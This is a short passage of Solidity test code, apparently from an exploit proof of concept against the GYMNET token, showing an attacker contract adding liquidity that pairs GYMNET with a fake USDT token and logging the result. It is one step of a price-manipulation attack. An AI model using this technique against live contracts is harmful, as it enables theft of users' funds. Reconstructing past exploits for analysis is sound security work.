        address(GYMNET),
        address(fakeUSDT),
        GYMNET.balanceOf(address(this)),
        fakeUSDT.balanceOf(address(this)),
        0,
        0,
        address(this),
        block.timestamp + 1000
    );

    emit log_named_decimal_uint(
        "2a. Added attacker's liquidity", CakeLP.balanceOf(address(this)), CakeLP.decimals()
